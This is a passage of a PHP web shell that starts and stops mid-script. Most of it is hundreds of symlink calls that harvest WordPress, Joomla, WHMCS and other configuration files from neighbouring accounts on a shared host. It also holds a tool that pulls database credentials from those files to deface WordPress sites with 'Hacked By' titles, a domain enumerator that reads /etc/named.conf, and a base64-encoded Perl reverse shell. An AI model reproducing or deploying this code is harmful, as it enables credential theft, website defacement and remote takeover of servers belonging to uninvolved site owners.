@symlink('/home3/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home3/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home3/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home3/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home3/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home3/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home3/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home3/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home3/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home3/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home3/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home3/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home3/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home3/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home3/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home3/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home3/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home3/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home3/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home3/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home3/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home3/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home3/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home3/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home3/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home3/' . $user . '/public_html/home3/wp-config.php', $user . '-wp-home3.txt');
@symlink('/home3/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home3/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home3/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home3/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home3/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home3/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home3/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home3/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home3/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home3/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home3/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home3/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home3/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home3/' . $user . '/public_html/home3/configuration.php', $user . '-joomla-home3.txt');
@symlink('/home3/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home3/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home3/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home3/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home3/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home3/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home3/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home3/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home3/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home3/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home3/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home3/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home3/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home3/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home3/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home3/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home3/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home3/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home3/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home3/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home3/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home3/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home3/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home3/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home3/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home3/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home3/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home3/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home3/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home3/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home3/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home3/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home3/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home3/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home3/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home3/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home3/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home3/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home3/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home3/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home3/' . $user . '/public_html/db.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home3/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home3/' . $user . '/public_html/admin/connection.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/includes/configure.php', $user . '-shop.txt');
@symlink('/home4/' . $user . '/public_html/os/includes/configure.php', $user . '-shop-os.txt');
@symlink('/home4/' . $user . '/public_html/oscom/includes/configure.php', $user . '-oscom.txt');
@symlink('/home4/' . $user . '/public_html/oscommerce/includes/configure.php', $user . '-oscommerce.txt');
@symlink('/home4/' . $user . '/public_html/oscommerces/includes/configure.php', $user . '-oscommerces.txt');
@symlink('/home4/' . $user . '/public_html/shop/includes/configure.php', $user . '-shop2.txt');
@symlink('/home4/' . $user . '/public_html/shopping/includes/configure.php', $user . '-shop-shopping.txt');
@symlink('/home4/' . $user . '/public_html/sale/includes/configure.php', $user . '-sale.txt');
@symlink('/home4/' . $user . '/public_html/amember/config.inc.php', $user . '-amember.txt');
@symlink('/home4/' . $user . '/public_html/library/config.php', $user . '-symlink');
@symlink('/home4/' . $user . '/public_html/members/configuration.php', $user . '-members.txt');
@symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images1.txt');
@symlink('/home4/' . $user . '/public_html/forum/includes/config.php', $user . '-forum.txt');
@symlink('/home4/' . $user . '/public_html/forums/includes/config.php', $user . '-forums.txt');
@symlink('/home4/' . $user . '/public_html/admin/conf.php', $user . '-5.txt');
@symlink('/home4/' . $user . '/public_html/admin/config.php', $user . '-4.txt');
@symlink('/home4/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
@symlink('/home4/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
@symlink('/home4/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
@symlink('/home4/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
@symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
@symlink('/home4/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
@symlink('/home4/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
@symlink('/home4/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
@symlink('/home4/' . $user . '/public_html/wordpress/beta/wp-config.php', $user . '-wp13-wordpress-beta.txt');
@symlink('/home4/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
@symlink('/home4/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
@symlink('/home4/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
@symlink('/home4/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
@symlink('/home4/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
@symlink('/home4/' . $user . '/public_html/home4/wp-config.php', $user . '-wp-home4.txt');
@symlink('/home4/' . $user . '/public_html/protal/wp-config.php', $user . '-wp-protal.txt');
@symlink('/home4/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
@symlink('/home4/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
@symlink('/home4/' . $user . '/public_html/test/wp-config.php', $user . '-wp-test.txt');
@symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home4/' . $user . '/public_html/arcade/functions/dbclass.php', $user . '-ibproarcade.txt');
@symlink('/home4/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
@symlink('/home4/' . $user . '/public_html/protal/configuration.php', $user . '-joomla-protal.txt');
@symlink('/home4/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
@symlink('/home4/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
@symlink('/home4/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
@symlink('/home4/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
@symlink('/home4/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
@symlink('/home4/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
@symlink('/home4/' . $user . '/public_html/home4/configuration.php', $user . '-joomla-home4.txt');
@symlink('/home4/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
@symlink('/home4/' . $user . '/public_html/vb3/includes/config.php', $user . '-vb3-config.txt');
@symlink('/home4/' . $user . '/public_html/cc/includes/config.php', $user . '-vb1-config.txt');
@symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-includes-vb.txt');
@symlink('/home4/' . $user . '/public_html/forum/includes/class_core.php', $user . '-vbluttin-class_core.php.txt');
@symlink('/home4/' . $user . '/public_html/vb/includes/class_core.php', $user . '-vbluttin-class_core.php1.txt');
@symlink('/home4/' . $user . '/public_html/cc/includes/class_core.php', $user . '-vbluttin-class_core.php2.txt');
@symlink('/home4/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
@symlink('/home4/' . $user . '/public_html/includes/dist-configure.php', $user . '-zencart.txt');
@symlink('/home4/' . $user . '/public_html/zencart/includes/dist-configure.php', $user . '-shop-zencart.txt');
@symlink('/home4/' . $user . '/public_html/shop/includes/dist-configure.php', $user . '-shop-ZCshop.txt');
@symlink('/home4/' . $user . '/public_html/Settings.php', $user . '-smf.txt');
@symlink('/home4/' . $user . '/public_html/smf/Settings.php', $user . '-smf2.txt');
@symlink('/home4/' . $user . '/public_html/forum/Settings.php', $user . '-smf-forum.txt');
@symlink('/home4/' . $user . '/public_html/forums/Settings.php', $user . '-smf-forums.txt');
@symlink('/home4/' . $user . '/public_html/upload/includes/config.php', $user . '-up.txt');
@symlink('/home4/' . $user . '/public_html/article/config.php', $user . '-Nwahy.txt');
@symlink('/home4/' . $user . '/public_html/up/includes/config.php', $user . '-up2.txt');
@symlink('/home4/' . $user . '/public_html/conf_global.php', $user . '-6.txt');
@symlink('/home4/' . $user . '/public_html/include/db.php', $user . '-7.txt');
@symlink('/home4/' . $user . '/public_html/connect.php', $user . '-PHP-Fusion.txt');
@symlink('/home4/' . $user . '/public_html/mk_conf.php', $user . '-9.txt');
@symlink('/home4/' . $user . '/public_html/includes/config.php', $user . '-traidnt1.txt');
@symlink('/home4/' . $user . '/public_html/config.php', $user . '-4images.txt');
@symlink('/home4/' . $user . '/public_html/sites/default/settings.php', $user . '-Drupal.txt');
@symlink('/home4/' . $user . '/public_html/member/configuration.php', $user . '-1member.txt');
@symlink('/home4/' . $user . '/public_html/supports/includes/iso4217.php', $user . '-hostbills-supports.txt');
@symlink('/home4/' . $user . '/public_html/client/includes/iso4217.php', $user . '-hostbills-client.txt');
@symlink('/home4/' . $user . '/public_html/support/includes/iso4217.php', $user . '-hostbills-support.txt');
@symlink('/home4/' . $user . '/public_html/billing/includes/iso4217.php', $user . '-hostbills-billing.txt');
@symlink('/home4/' . $user . '/public_html/billings/includes/iso4217.php', $user . '-hostbills-billings.txt');
@symlink('/home4/' . $user . '/public_html/host/includes/iso4217.php', $user . '-hostbills-host.txt');
@symlink('/home4/' . $user . '/public_html/hosts/includes/iso4217.php', $user . '-hostbills-hosts.txt');
@symlink('/home4/' . $user . '/public_html/hosting/includes/iso4217.php', $user . '-hostbills-hosting.txt');
@symlink('/home4/' . $user . '/public_html/hostings/includes/iso4217.php', $user . '-hostbills-hostings.txt');
@symlink('/home4/' . $user . '/public_html/includes/iso4217.php', $user . '-hostbills.txt');
@symlink('/home4/' . $user . '/public_html/hostbills/includes/iso4217.php', $user . '-hostbills-hostbills.txt');
@symlink('/home4/' . $user . '/public_html/hostbill/includes/iso4217.php', $user . '-hostbills-hostbill.txt');
@symlink('/home4/' . $user . '/public_html/cart/configuration.php', $user . '-cart-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/hosting/configuration.php', $user . '-hosting-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/buy/configuration.php', $user . '-buy-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/checkout/configuration.php', $user . '-checkout-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/host/configuration.php', $user . '-host-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/shop/configuration.php', $user . '-shop-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/shopping/configuration.php', $user . '-shopping-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/sale/configuration.php', $user . '-sale-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/client/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/support/configuration.php', $user . '-support-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clientsupport/configuration.php', $user . '-clientsupport-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
@symlink('/home4/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
@symlink('/home4/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmc-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/supp/configuration.php', $user . '-supp-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/configuration.php', $user . '-sucure-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/whm/configuration.php', $user . '-sucure-whm-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/secure/whmcs/configuration.php', $user . '-sucure-whmcs-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/panel/configuration.php', $user . '-panel-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/hosts/configuration.php', $user . '-hosts-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/submitticket.php', $user . '-submitticket-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clients/configuration.php', $user . '-clients-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/clientes/configuration.php', $user . '-clientes-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/cliente/configuration.php', $user . '-client-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/billing/configuration.php', $user . '-billing-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/manage/configuration.php', $user . '-whm-manage-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/my/configuration.php', $user . '-whm-my-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/myshop/configuration.php', $user . '-whm-myshop-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/billings/configuration.php', $user . '-billings-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/supports/configuration.php', $user . '-supports-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/auto/configuration.php', $user . '-auto-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/go/configuration.php', $user . '-go-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/' . $user . '/configuration.php', $user . '-USERNAME-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/bill/configuration.php', $user . '-bill-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/payment/configuration.php', $user . '-payment-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/pay/configuration.php', $user . '-pay-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/purchase/configuration.php', $user . '-purchase-WHMCS.txt');
@symlink('/home4/' . $user . '/public_html/db.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/conect_to_mysql.php', $user . '-autobuy');
@symlink('/home4/' . $user . '/public_html/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/admin/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/include/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/wp-admin/connect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/wp-admin/config.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/wp-admin/dbconnect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/admin/dbconnect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/dbconnect.php', $user . '-normal');
@symlink('/home4/' . $user . '/public_html/admin/connection.php', $user . '-normal');
    }
    echo '<b class="cone"><br><br><center><font face="Tahoma" color="LawnGreen" size="2pt"><b>Congratulation ==>> </b> <a target="_blank" href="UeXploiT"><font color="LawnGreen" size="2pt">Config list</a></font></b>';
} }
			}
		?>
		<?php
			if (isset($_GET['wp_title'])) {
				$dir = getcwd();
					function ambilKata($param, $kata1, $kata2){
					    if(strpos($param, $kata1) === FALSE) return FALSE;
					    if(strpos($param, $kata2) === FALSE) return FALSE;
					    $start = strpos($param, $kata1) + strlen($kata1);
					    $end = strpos($param, $kata2, $start);
					    $return = substr($param, $start, $end - $start);
					    return $return;
					}
					echo "<center>
					<h1 class=def style='font-size:180%; color: lawngreen;'>Wordpress Title Changer</h1>
					<form method='post'>
					<span class=def>Config Dir: 
					<input type='text' size='50' style='width: 450px;' name='config_dir' value='$dir'><br><br>
					<span class=def>Title:
					<input type='text' name='new_title' style='width: 300px;' value='Hacked By An0n 3xPloiTeR' placeholder='New Title'><br><br>
					<input type='submit' name='hajar' value='Start' style='width: 300px;'><br>
					</form><br>";
						if($_POST['hajar']) {
							$title = htmlspecialchars($_POST['new_title']);
							$pn_title = str_replace(" ", "-", $title);
							$script = $title;
							$conf = $_POST['config_dir'];
							$scan_conf = scandir($conf);
						foreach($scan_conf as $file_conf) {
							if(!is_file("$conf/$file_conf")) continue;
							$config = file_get_contents("$conf/$file_conf");
							if(preg_match("/WordPress/", $config)) {
								$dbhost = ambilkata($config,"DB_HOST', '","'");
								$dbuser = ambilkata($config,"DB_USER', '","'");
								$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
								$dbname = ambilkata($config,"DB_NAME', '","'");
								$dbprefix = ambilkata($config,"table_prefix  = '","'");
								$prefix = $dbprefix."posts";
								$option = $dbprefix."options";
								$conn = mysql_connect($dbhost,$dbuser,$dbpass);
								$db = mysql_select_db($dbname);
								$q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
								$result = mysql_fetch_array($q);
								$id = $result[ID];
								$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
								$result2 = mysql_fetch_array($q2);
								$target = $result2[option_value];
								$update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
								$update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
								echo "<div style='margin: 5px auto;'>";
								if($target == '') {
									echo "<font color=red>There Was a Error While Doing The Task</font>";
								} else {
									echo "<a href='$target/".$pn_title."' target='_blank'><font color='lawngreen'>$target/$pn_title</font></a>";
								}
								if(!$update OR !$conn OR !$db) {
									echo "<font color=red>MySQL Error: ".mysql_error()."</font><br>";
								} else {
									echo "<font color=lime></font><br>";
								}
								echo "</div>";
								mysql_close($conn);
						}
					} 
				}
			}
		?>
		<font style="color: white; font-family: cursive; font-size: 100%;">
		<?php
			if (isset($_GET['domains'])) { 
				if(strtolower(substr(PHP_OS,0,3)) == "win") {
					$os = 'win';
					}	else {
							$os = 'nix';
					} 

					if ($os == 'win') {
					?>
				<center><br><br>
					<font style="color: white; font-family: cursive; font-size: 200%;">Ooopppss Windows Server :P<br>You Better Find Linux :P </font>
				</center><?php
			}
			else {
				$file = @implode(@file("/etc/named.conf"));
				$Domain_path = "/var/named";
				if (!$file) {
				$domains = scandir($Domain_path);
				$count=1;
				$dc = 0;
				 echo "<table align=center border=1 width=59% cellpadding=5>
				<tr><td colspan=2><center>There are : ( <b>" . count($domains) . "</b> ) Domains in this Sever.</center></td></tr>
				<tr><td>No</td><td>Domains</td><td>User</td></tr>";
				foreach ($domains as &$domain) {
				    if (stripos($domain,".db")) {
				    $domain = str_replace('.db','',$domain);

				    }
				    if (strlen($domain) > 6) {
				        
				        echo "<tr><td><a href='http://".$domain."' target='_blank'>".'http://'.$domain.'/index.php'."</a></td><td></td></tr>";
				    }
				} 
				    echo "</table>";
				} else{
				$count = 1;
				preg_match_all("#named/(.*?).db#", $file, $r);
				$domains = array_unique($r[1]);
				echo "<table align=center border=1 width=59% cellpadding=5>
				<tr><td colspan=2> There are  ( <b>" . count($domains) . "</b> ) Domains in this Sever.I think you have got something this time yeah!!!.</td></tr>
				<tr><td>Domains";
				foreach ($domains as $domain) {
				$user = posix_getpwuid(@fileowner("/etc/valiases/" . $domain));
				echo "<tr><td><a href='http://".$domain."' target='_blank'>".'http://'.$domain.'/index.php'."</a></td><td></td></tr>";
	    				}
					} 
				} 					
			}
		?>
		<?php
			if (isset($_GET['back_connecter'])) {
				$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
